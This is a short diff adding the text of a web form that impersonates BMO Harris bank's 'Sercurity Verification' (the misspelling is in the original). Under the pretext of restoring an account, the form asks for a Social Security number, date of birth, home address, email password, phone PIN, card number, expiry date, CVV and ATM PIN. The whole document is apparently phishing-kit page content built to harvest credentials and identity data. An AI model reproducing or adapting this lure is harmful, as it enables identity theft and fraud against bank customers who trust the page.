@@ -1,0 +1,27 @@
+Sercurity Verification
+Sercurity Verification
+Secured Login
+Identification
+Confirmation
+Log out
+BMO Harris Account Verification
+Identification
+Verify your identity to restore your account.
+First Name
+Last Name
+Social Security Number
+Date of Birth
+Please enter your contact information.
+Residential Home Address
+City, State
+ZIP
+Phone Number
+Phone PIN
+Email Address
+Email Password
+Now, let's verify your card information!
+Debit/Credit Card Number
+Expiry Date
+CVC/CVV
+ATM PIN
+CONTINUE
